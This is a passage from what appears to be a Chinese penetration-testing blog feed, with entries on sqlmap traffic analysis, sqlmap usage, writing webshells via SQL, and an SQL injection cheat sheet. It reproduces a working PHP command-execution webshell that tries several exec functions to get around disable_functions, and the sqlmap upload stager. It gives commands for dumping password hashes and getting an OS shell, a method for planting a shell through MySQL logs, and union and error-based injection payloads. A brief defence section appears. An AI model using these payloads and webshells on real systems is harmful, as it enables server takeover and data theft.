class="hljs-variable">$file</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>();<br>                               &#125;<span class="hljs-keyword">else</span>&#123;<br>                                   <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>                                   @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-variable">$dir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$file</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>();<br>                                   &#125;<br>     @<span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$file</span>,<span class="hljs-number">0755</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File uploaded&quot;</span>; <span class="hljs-comment">//修改文件夹权限</span><br>   &#125;<span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;form action=&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;PHP_SELF&quot;</span>].<span class="hljs-string">&quot; method=POST enctype=multipart/form-data&gt;</span><br><span class="hljs-string">           &lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;</span><br><span class="hljs-string">           &lt;b&gt;sqlmap file uploader&lt;/b&gt;</span><br><span class="hljs-string">           &lt;br&gt;</span><br><span class="hljs-string">           &lt;input name=file type=file&gt;</span><br><span class="hljs-string">           &lt;br&gt;</span><br><span class="hljs-string">           to directory: &lt;input type=text name=uploadDir value=\\&#x27;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-1&#x27;\\&gt; </span><br><span class="hljs-string">           &lt;input type=submit name=upload value=upload&gt;</span><br><span class="hljs-string">           &lt;/form&gt;&quot;</span>;<br>                               &#125;<br>                               <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第二个数据包才是正真上传马子的数据</p><p><img src="/2021/02/01/sqlmap1/image-20221023214458906.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]; <span class="hljs-comment">//通过前期上传的文件上传php上传马子</span><br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;max_execution_time&quot;</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$z</span>=@<span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&quot;disable_functions&quot;</span>); <span class="hljs-comment">//php.ini配置文件中被禁用掉的命令执行函数</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$z</span>))&#123;<br>    <span class="hljs-variable">$z</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[, ]+/&quot;</span>,<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$z</span>);<br>    <span class="hljs-variable">$z</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$z</span>);<br>    <span class="hljs-variable">$z</span>=<span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&quot;trim&quot;</span>,<span class="hljs-variable">$z</span>); <span class="hljs-comment">//如果有被禁用的函数，则转进一个数组里面</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$z</span>=<span class="hljs-keyword">array</span>();&#125;<span class="hljs-variable">$c</span>=<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; 2&gt;&amp;1\n&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"><span class="hljs-variable">$n</span></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$z</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$n</span>)<span class="hljs-keyword">and</span>!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$n</span>,<span class="hljs-variable">$z</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;system&quot;</span>))&#123;<span class="hljs-comment">//调用f()函数，看1是否在禁用名单内，如果不在，用这个命令执行函数来执行用户传入的cmd（命令）</span><br>    <span class="hljs-title function_ invoke__">ob_start</span>();<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-variable">$w</span>=<span class="hljs-title function_ invoke__">ob_get_clean</span>();<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;proc_open&quot;</span>))&#123;<br>    <span class="hljs-variable">$y</span>=<span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$c</span>,<span class="hljs-keyword">array</span>(<span class="hljs-keyword">array</span>(pipe,r),<span class="hljs-keyword">array</span>(pipe,w),<span class="hljs-keyword">array</span>(pipe,w)),<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$w</span>=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$t</span>[<span class="hljs-number">1</span>]))&#123;<br>        <span class="hljs-variable">$w</span>.=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$t</span>[<span class="hljs-number">1</span>],<span class="hljs-number">512</span>);<br>    &#125;@<span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$y</span>);<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;shell_exec&quot;</span>))&#123;<br>    <span class="hljs-variable">$w</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;passthru&quot;</span>))&#123;<br>    <span class="hljs-title function_ invoke__">ob_start</span>();<br>    <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-variable">$w</span>=<span class="hljs-title function_ invoke__">ob_get_clean</span>();<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;popen&quot;</span>))&#123;<br>    <span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-variable">$c</span>,r);<br>    <span class="hljs-variable">$w</span>=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$x</span>))&#123;<br>        <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$x</span>))&#123;<span class="hljs-variable">$w</span>.=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$x</span>,<span class="hljs-number">512</span>);<br>                        &#125;<br>    &#125;@<span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$x</span>);<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;exec&quot;</span>))&#123;<br>    <span class="hljs-variable">$w</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$c</span>,<span class="hljs-variable">$w</span>);<br>    <span class="hljs-variable">$w</span>=<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">10</span>),<span class="hljs-variable">$w</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">10</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$w</span>=<span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$w</span>&lt;/pre&gt;&quot;</span>;<span class="hljs-comment">//回显结果</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>sqlmap流量分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlmap流量分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap的使用</title>
    <link href="/2021/01/28/sql4/"/>
    <url>/2021/01/28/sql4/</url>
    
    <content type="html"><![CDATA[<p>SQLmap是一种开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令。</p><p>支持的数据库:MySQL，Oracle,PostgreSQL,Microsoft SQL’Server,Microsoft Access,IBM DB2,SQLite,Firebird, Sybase andSAP MAXDB。</p><p>sQLmap支持五种不同的注入模式:<br>◆UNION query sQL injection(可联合查询注入)</p><p>◆Error-based sQL injection(报错型注入)<br>◆Boolean-based blind sQL injection(布尔型注入)</p><p>◆Time-based blind sQL injection(基于时间延迟注入）</p><p>◆Stacked queries sQL injection (可多语句查询注入)</p><p>二、设置目标URL</p><p>-u&#x2F;–url<br>最基本格式sqlmap -u”<a href="http://www.target.com/index.php?id=1%E2%80%9D">http://www.target.com/index.php?id=1”</a></p><p>-m<br>从文本中获取多个目标扫描,但是每一行只能有一个ur1.sqlmap-ur1list.txt</p><p>-r<br>从文件中加载HTTP请求，这样的话就不需要在去设定cookie, POST数据……等等。</p><p>三、设置回显等级<br>参数: -v默认为1:<br>0、只显示python错误以及严重的信息。<br>1、同时显示基本信息和警告信息。（默认等级&gt;</p><p>2、同时显示debug信息。<br>3、同时显示注入的payload。</p><p>4、同时显示HTTP请求。</p><p>5、同时显示HTTP响应头。</p><p>6、同时显示HTTP响应页面。</p><p>四、设置HTTP数据包相关参数<br>参数: –data<br>此参数是把data后面的数据以POST方式提交，sqlmap会像检测GET参数一样检测POST提交过去的参数。<br>python sqlmap.py -u “<a href="http://www.target.com/vuln.php&quot;">http://www.target.com/vuln.php&quot;</a> –data&#x3D;”id&#x3D;1”<br>参数: –cookie<br>当web需要登录的时候，需要我们抓包获取cookie参数，然后复制出来，加到–cookie参数中。<br>–cookie&#x3D;” Cookie: Hm_lvt6910067,1546929561,1547001094,1547024662;PHPSESSID&#x3D;o64fbvo316lg59njufl2gfutm4; “</p><p>四、设置HTTP数据包相关参数<br>HTTP User-Agent头参数:–user-agent<br>默认情况下sqlmap的HTTP请求头中的User-Agent值是: sqlmap&#x2F;1.O-dev-xxxxxxxxx(<a href="http://sqlmap.org/">http://sqlmap.org</a>)<br>这个时候可以手动指定伪造一个User-Agent。<br>sqlmap -u “<a href="http://www.target.com”--level/">http://www.target.com”--level</a> 3 –user-agent&#x3D;” aaaaaa” –dbs<br>参数: –random-agent会从&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;txt&#x2F;user-agents.txt中随机产生User-Agent头。<br>sqlmap -u “<a href="http://www.target.com”/">http://www.target.com”</a> –level 3 –random-agent –dbs<br>sqlmap检查uesr-agent中的注入点, level&gt;&#x3D;3才会去检查user-agent头是否存在注入漏洞</p><p>四、设置HTTP数据包相关参数<br>HTTP Referer头<br>参数: –referer<br>sqlmap可以在请求中伪造HTTP中的referer。sqlmap -u “<a href="http://www.target.com/?id=1%E2%80%9Dreferer=&quot;">http://www.target.com/?id=1”referer=&quot;</a> <a href="http://www.baidu.com&quot;/">http://www.baidu.com&quot;</a><br>当–level参数设定&gt;&#x3D;3时，会尝试进行referer注入。</p><p>四、设置HTTP数据包相关参数<br>–delay<br>可以设定两个http请求间的延迟，设定为1的时候是1秒，默认是没有延迟的。<br>–timeout<br>可以设定一个http请求超过多少秒判定为超时，默认是30秒。</p><p>五、指定测试参数<br>-p ,<br>sqlmap默认会测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User- Agent和HTTP Referer头的值。<br>例如: -p“id,user-angent”<br>–skip<br>在使用–level时，级别很大的时候，但是有些参数不能去测试，那么可以使用–skip参数跳过。<br>例如: –skip&#x3D;” user-agent,referer”</p><p>六、设定探测等级<br>–level (sqlmap -r情况下)<br>共有五个等级，默认为1，sqlmap使用的payload可以在<br>xml&#x2F;payloads.xml中看到，自己也可以根据相应的格式添加自己的payload。<br>level&gt;&#x3D;2的时候就会测试HTTP Cookie。<br>level&gt;&#x3D;3的时候就会测试HTTP User-Agent&#x2F;Referer头。level&#x3D;5的时候会测试HTTP Host。</p><p>七、设定探测风险等级<br>–risk<br>共有三个风险等级，1-3，<br>默认是1会测试大部分的测试语句，2会增加基于时间的测试语句，3会增加OR语句的SQL注入测试。<br>在有些时候，例如在UPDATE，DELETE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p><p>八、列数据</p><p>–dbs<br>列出所有的数据库<br>列出当前登录的用户名<br>–users,<br>–passwords,<br>列出当前登录的用户密码<br>–is-dba<br>判断是否root权限<br>–technique :指定使用哪种注入类型<br>B:基于Boolean的盲注（Boolean based blind&gt;Q:内联查询(inlin queries)<br>T:基于时间的盲注（time based blind&gt;U:联合查询(union query based)E:错误（error based）<br>S:栈查询(stack queries)<br>速度排序&#x3D;联合&gt;报错&gt;布尔&gt;延迟</p><p>八、列数据<br>–current-db当前数据库–privileges权限<br>-Ddatabase_name –tables<br>-Ddatabase_name -T table_name –columns<br>-D database_name -T table_name -C column_1,column_2 –dump</p><p>九、一些常用的参数<br>–users列数据库管理用户,当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。<br>–current-user在大多数据库中可以获取到管理数据的用户。–is-dba 判断当前的用户是否为管理，是的话会返回True。<br>–privileges当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看那个用户的权限。</p><p>九、一些常用的参数<br>–proxy指定一个代理服务器eg:-proxy <a href="http://local:8080select">http://local:8080select</a> * from users where id&#x3D;l(1’)))<br>–prefix&#x3D;PREFIX注入payload字符串前缀-suffix&#x3D;SUFFIX注入payload字符串后缀<br>eg: sqlmap -u “<a href="http://www.target.com/index.php?id=1%E2%80%9D">www.target.com/index.php?id=1”</a> -p id –prefix “”))))”–suffix“AND (‘1’&#x3D;’1”</p><p>九、一些常用的参数<br>移动文件:<br>sqlmap -u “<a href="http://www.a.com/1.php?id=1%E2%80%9D--file-write=&quot;">www.a.com/1.php?id=1”--file-write=&quot;</a> d:&#x2F;2.txt”–file-dest&#x3D;”E:&#x2F;wwwroot&#x2F;bihuoedu&#x2F;one.php “<br>–batch 全自动<br>–start&#x3D;开始条数–stop&#x3D;结束条数–dump 导出当前数据库所有数据–dump-all 导出数据库所有数据–purge清空缓存目录<br>–sql-shell反弹sqlshell,类似于sql查询分析器默认路径.sqlmap(点sqlmap)</p><p>十、使用shell命令:<br>参数–os-shell(分析一下）<br>前提:需要网站的物理路径，其次是需要有FIILE权限。<br>sqlmap -r“C: \sqlmap\request.txt” -p id –dms mysql –os-shell接下来指定网站可写目录:<br>“C: \www”<br>d : \phpstudy \www(成功)</p><p>十一.sqlmap常用脚本</p><p>序号 脚本名称注释<br>1Ox2char将每个编码后的字符转换为等价表达<br>2apostrophemask单引号替换为Utf8字符<br>3apostrophenullencode替换双引号为%00%27<br>4appendnullbyte有效代码后添加%00<br>5base64encode使用base64编码<br>6between比较符替换为between<br>7bluecoat空格替换为随机空白字符，等号替换为like<br>8chardoubleencode双url编码<br>9charencode将url编码<br>10charunicodeencode 使用unicode编码<br>11charunicodeescape以指定的payload反向编码未编码的字符<br>12commalesslimit改变limit语句的写法<br>13commalessmid改变mid语句的写法<br>14commentbeforeparentheses在括号前加内联注释<br>15concat2concatws替换CONCAT为CONCAT_wS</p>]]></content>
    
    
    
    <tags>
      
      <tag>sqlmap的使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql写马</title>
    <link href="/2021/01/27/sql3/"/>
    <url>/2021/01/27/sql3/</url>
    
    <content type="html"><![CDATA[<p>今天实战的时候遇到写木马被限制了,一时想不起来还有啥方法,于是特出此篇记录….顺便复习一下防御手段</p><h6 id="一-数据库慢日志写木马"><a href="#一-数据库慢日志写木马" class="headerlink" title="一.数据库慢日志写木马"></a>一.数据库慢日志写木马</h6><p>security_file_priv会阻拦我们使用outfile写入文件,没有服务器权限无法修改my.ini配置文件,可以利用慢查询日志写入shell</p><p>有时候全局日志会写死</p><p>使用慢查询日志,只有超时(系统时间)才会被写入日志</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%slow_query_log%&#x27;</span>;  <br><br>-- show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%general_log%&#x27;</span>;  <br>-- show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%slow_query_log%&#x27;</span>;  <br>-- <span class="hljs-keyword">set</span> global <span class="hljs-comment">slow_query_log =</span><span class="hljs-comment">&#x27;C:/phpstudy_pro/WWW/hh.php&#x27;</span><br>-- <span class="hljs-keyword">set</span> <span class="hljs-comment">global slow_query_log_file =</span> <span class="hljs-comment">&#x27;C:/phpstudy_pro/WWW/hh.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>版本不一样,语句写法不一样</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">-- show global variables like &#x27;%long_query_time%&#x27;;适用于小皮面板的环境</span><br><span class="language-xml">-- select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; or sleep(11); </span><br></code></pre></td></tr></table></figure><h6 id="二-数据库全局日志写木马"><a href="#二-数据库全局日志写木马" class="headerlink" title="二.数据库全局日志写木马"></a>二.数据库全局日志写木马</h6><p>查看是否开启全局日志</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%general%&#x27;</span>; <br></code></pre></td></tr></table></figure><p>开启全局日志 </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-keyword">on</span>; <br></code></pre></td></tr></table></figure><p> 将全局日志路径设置为shell文件路径 </p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file = <span class="hljs-string">&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;</span>;  <br></code></pre></td></tr></table></figure><p>执行语句,日志记录语句,并会执行</p><h6 id="三-sql注入防御"><a href="#三-sql注入防御" class="headerlink" title="三.sql注入防御"></a>三.sql注入防御</h6><p>防御sql注入的核心思想就是对用户输入的数据进行严格的检查,并且对数据库的使用最小权限分配规则.目前sql注入的防御手段有以下几种:</p><p>1.预编译(PDO)</p><p>一般遇到这种,如果后端代码编写没有逻辑上的错误,一般都注入不成功,但是有个特例,如果具有order by 语句的话不能使用预编译(因为”order by后不能参数化的本质是：一方面预编译又只有自动加引号的setString()方法，没有不加引号的方法；而另一方面order by后接的字段名不能有引号。”)</p><p>2.基于攻击特征的匹配过滤.</p><p>这是目前使用最广泛大的方式,系统会将攻击特征做成数据库,一旦匹配到这些攻击特征就会认定检测得到sql注入.这种方式可以有效的过滤大部分sql注入攻击,但是大大增加了程序的复杂度,同时也有可能影响到业务的正常查询.</p><p>3.对用户输入进行转义.</p><p>例如,常见的SQL注入语句中都有单引号双引号之类的,通过转义,SQL注入就不会达到攻击者所预期的执行效果,从而是实现对sql注入进行防御</p><p>4.数据类型进行严格定义.数据长度进行严格规定.</p><p>比如查询数据库某条记录的id,定义它为整形如果用户输入的数据不符合条件,要对数据进行过滤,数据长度也应该做严格的限制,可以防止较长的SQL注入语句.</p><p>5.严格限制网站访问数据库的权限</p><p>6.其他防御措施.例如避免网站显示sql执行错误信息,防止攻击者使用基于错误的方式进行注入;每个数据层编码同意,防止过滤模型被绕过等</p><p>7.相关函数</p><p>inteval(数字化) addslashes(转义),mysql_real_eacape_string()(这个好想已经被弃用)</p><p>这几天实战发现有些后端编写有点那啥,一输入单引号或者双引号,直接die掉程序(部分搜索之类功能),有的更是离谱,有一个括号加空格闭合的.这比n个单双引号闭合还离谱.</p>]]></content>
    
    
    <categories>
      
      <category>sql写马</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql写马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入备忘录</title>
    <link href="/2021/01/25/sql2/"/>
    <url>/2021/01/25/sql2/</url>
    
    <content type="html"><![CDATA[<h2 id="SQL注入备忘表"><a href="#SQL注入备忘表" class="headerlink" title="SQL注入备忘表"></a>SQL注入备忘表</h2><h4 id="一-联合注入"><a href="#一-联合注入" class="headerlink" title="一 . 联合注入"></a>一 . 联合注入</h4><p>列出所有数据库 : </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">limit</span> 一个一个打印出来库名<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">SCHEMA_NAME</span> <span class="hljs-keyword">from</span> information_schema.SCHEMATA <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br>group_concat 一次性全部显示<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">SCHEMA_NAME</span>) <span class="hljs-keyword">from</span> information_schema.SCHEMATA<br><br></code></pre></td></tr></table></figure><p>列出(数据库：test)中所有的表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">limit</span> 一个一个打印出来字段名<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">TABLE_NAME</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br>group_concat 一次性全部显示<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">TABLE_NAME</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-number">0x674657374</span><br>注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。<br></code></pre></td></tr></table></figure><p>列出（数据库：test 表：admin ）中所有的字段</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">imit 一个一个打印出来<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">COLUMN_NAME</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">COLUMNS</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">TABLE_NAME</span>=<span class="hljs-string">&#x27;t10&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br>group_concat 一次性全部显示<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">COLUMN_NAME</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">COLUMNS</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-number">0x74657374</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">TABLE_NAME</span>=<span class="hljs-number">0x61646d696e</span><br><br></code></pre></td></tr></table></figure><p>列出（数据库：test 表：admin ）中所有的字段内容</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">limit</span> 一个一个打印出来<br><span class="hljs-keyword">select</span> username,passwd <span class="hljs-keyword">from</span> test.<span class="hljs-keyword">admin</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br>group_concat 把 一次性全部打印<br><span class="hljs-keyword">select</span> group_concat(concat(username,<span class="hljs-number">0x20</span>,passwd)) <span class="hljs-keyword">from</span> test.<span class="hljs-keyword">admin</span><br></code></pre></td></tr></table></figure><h4 id="二-报错注入"><a href="#二-报错注入" class="headerlink" title="二 . 报错注入"></a>二 . 报错注入</h4><p>请注意,如果需要全部显示数据库需要用到substr函数</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> substr(字符串,<span class="hljs-number">1</span>,截取长度)<br><span class="hljs-keyword">select</span> substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">SCHEMA_NAME</span>) <span class="hljs-keyword">from</span> information_schema.SCHEMATA),<span class="hljs-number">1</span>,<span class="hljs-number">7</span>);<br></code></pre></td></tr></table></figure><h6 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错 :"></a>floor报错 :</h6><p>获取总共多少数据库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> count(*),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> concat(<span class="hljs-number">0x7e</span>,count(<span class="hljs-built_in">schema_name</span>),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> information_schema.schemata)) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a)<br></code></pre></td></tr></table></figure><p>列出数据库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">单个列出 :<br><span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(*),concat(concat((<span class="hljs-keyword">select</span> <span class="hljs-built_in">SCHEMA_NAME</span> <span class="hljs-keyword">from</span> information_schema.SCHEMATA <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> 